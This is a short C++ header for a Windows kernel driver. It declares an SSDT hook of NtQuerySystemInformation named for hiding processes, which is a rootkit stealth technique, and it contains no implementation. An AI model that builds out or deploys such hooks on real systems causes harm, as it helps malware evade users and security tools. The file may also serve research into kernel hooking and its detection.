#pragma once
#include <ntddk.h>

#include <basetsd.h>
#include <windef.h>

#include "../../SSDTManager/SSDTHooksManager.h"

typedef NTSTATUS(*NT_QUERY_SYSTEM_INFORMATION)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);


extern "C" NTSTATUS NtQuerySystemInformationHook_HideProcess(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength);

